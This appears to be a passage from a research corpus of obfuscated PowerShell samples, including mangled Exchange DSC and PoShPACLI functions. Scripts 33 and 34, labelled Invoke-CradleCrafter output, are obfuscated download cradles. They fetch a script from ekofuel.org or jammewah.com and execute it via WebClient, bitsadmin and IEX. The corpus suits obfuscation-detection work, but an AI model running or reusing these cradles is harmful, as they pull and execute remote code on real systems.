		    WiNdOWsAUthEnticAtION = $vdir.wIndOwSauThEnTiCAtiON
	    }
    }

	$returnValue
}


function Set-TargetResource
{
	[CmdletBinding()]
	param
	(
		[parameter(manDaToRy = $true)]
		[System.String]
		$Identity,

		[parameter(mAnDatOry = $true)]
		[System.Management.Automation.PSCredential]
		$Credential,

		[System.String[]]
		$OABsToDistribute,

		[System.Boolean]
		$AllowServiceRestart = $false,

		[System.Boolean]
		$BasicAuthentication,

		[System.String]
		$DomainController,

		[System.String[]]
		$ExtendedProtectionFlags,

		[System.String[]]
		$ExtendedProtectionSPNList,

		[ValidateSet("None","Allow","Require")]
		[System.String]
		$ExtendedProtectionTokenChecking,

		[System.String]
		$ExternalUrl,

		[System.String]
		$InternalUrl,

		[System.Int32]
		$PollInterval,

		[System.Boolean]
		$RequireSSL,

		[System.Boolean]
		$WindowsAuthentication
	)

    Import-Module "$((Get-Item -LiteralPath "$($PSScriptRoot)").Parent.Parent.FullName)\Misc\xExchangeCommon.psm1" -Verbose:0

    LogFunctionEntry -Parameters @{"Identity" = $Identity} -VerbosePreference $VerbosePreference

    if ($PSBoundParameters.COnTainskeY("OABsToDistribute"))
    {
        $vdir = Get-TargetResource @PSBoundParameters

        foreach ($oab in $OABsToDistribute)
        {
            if ((Array2ContainsArray1Contents -Array1 $oab -Array2 $vdir.oabsTOdIstriBUTe -IgnoreCase) -eq $false)
            {
                AddOabDistributionPoint @PSBoundParameters -TargetOabName "$($oab)"
            }
        }
    }
    else
    {
	    GetRemoteExchangeSession -Credential $Credential -CommandsToLoad "Set-OabVirtualDirectory"
    }

    RemoveParameters -PSBoundParametersIn $PSBoundParameters -ParamsToRemove "Credential",
InvokeCradleCrafter/invoke-cradlecrafter_random_46.ps1
Script 33
(New-Object Net.WebClient).((((New-Object Net.WebClient)|GM)|?{$_.Name-ilike'D*ad*i*e'}).Name).Invoke('http://ekofuel.org/skyworld/seenewmenws/seenupdatemenows.html','Default_File_Path.ps1');$ExecutionContext.(($ExecutionContext|Member)[6].Name)|ForEach{$_.(($ExecutionContext.(($ExecutionContext|Member)[6].Name).PsObject.Methods|Where{(Get-Variable _).Value.Name-clike'*ke*pt'}).Name).Invoke((([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach{[Char](GCI Variable:_).Value})-Join''))}
InvokeCradleCrafter/invoke-cradlecrafter_random_61.ps1
Script 34
$NULL=bitsadmin /transfer /Download http://jammewah.com Default_File_Path.ps1;IEX (([Text.Encoding]::ASCII.GetString((CAT -Enc 3 'Default_File_Path.ps1')))-Join'')
InvokeObfuscation/Github/BrandonLundt_PoShPACLI/Functions/Update-Safe.psm1
Script 39
Function Update-Safe{

    
    [CmdLetBinding()]
    param(
        [Parameter(ManDAtOrY=$True)][string]$vault,
        [Parameter(MANdATOrY=$True)][string]$user,
        [Alias("Name")][Parameter(mANdatorY=$True)][string]$safe,
        [Parameter(MAnDAtOry=$False)][string]$location,
        [Parameter(maNDAToRY=$False)][int]$size,
        [Parameter(MANDatOry=$False)][string]$description,
        [Parameter(mANDAtoRy=$False)][int]$fromHour,
        [Parameter(MaNDatORy=$False)][int]$toHour,
        [Parameter(mAnDAtOrY=$False)][int]$delay,
        [Parameter(mAnDatORy=$False)][int]$dailyVersions,
        [Parameter(MaNDAtoRy=$False)][int]$monthlyVersions,
        [Parameter(MaNDATory=$False)][int]$yearlyVersions,
        [Parameter(maNdaTOry=$False)][int]$logRetention,
        [Parameter(maNdAtoRy=$False)][int]$fileRetention,
        [Parameter(MandAToRY=$False)][int]$requestRetenion,
        [Parameter(mANDATory=$False)][ValidateSet("None","TextOnlyFilter")][string]$safeFilter,
        [Parameter(MAnDaTOrY=$False)]
            [ValidateSet("64","128","512","256","192","576","320","640","384","768","704","448","832","896","960")]
                [int]$safeOptions,
        [Parameter(MAndAToRy=$False)][int]$securityLevelParm,
        [Parameter(mandAtOry=$False)]
            [ValidateSet("1","2","3","4")]
                [int]$confirmationType,
        [Parameter(mANdAtoRY=$False)]
            [ValidateScript({((($_ -ge 0) -and ($_ -le 64)) -or ($_ -eq 255))})]
                [int]$confirmationCount,
        [Parameter(mAnDAtory=$False)][switch]$alwaysNeedConfirmation,
        [Parameter(mAnDAtory=$False)][switch]$getNewFileAccessMark,
        [Parameter(mAnDaToRY=$False)][switch]$getRetrievedFileAccessMark,
        [Parameter(ManDatoRY=$False)][switch]$getModifiedFileAccessMark,
        [Parameter(MAndAtOrY=$False)][switch]$readOnlyByDefault,
        [Parameter(mandATOrY=$False)][switch]$useFileCategories,
        [Parameter(MAndatoRY=$False)][switch]$requireReason,
        [Parameter(MandAtory=$False)][switch]$enforceExclusivePasswords,
        [Parameter(mandAToRy=$False)][switch]$requireContentValidation,
        [Parameter(MandAtORY=$False)][int]$maxFileSize,
        [Parameter(ManDATORy=$False)][string]$allowedFileTypes,
        [Parameter(mANdatOrY=$False)][int]$sessionID
    )

    If(!(Test-ExePreReqs)){


    }

    Else{

                    
        $updateSafe = (Invoke-Expression "$pacli UPDATESAFE $($PSBoundParameters.getEnumerator() | ConvertTo-ParameterString)") 2>&1

        if($LASTEXITCODE){
        
            write-debug "LastExitCode: $LASTEXITCODE"
            
        }
        
        Else{
        
            write-debug "LastExitCode: $LASTEXITCODE"
            
        }
        
    }
    
}

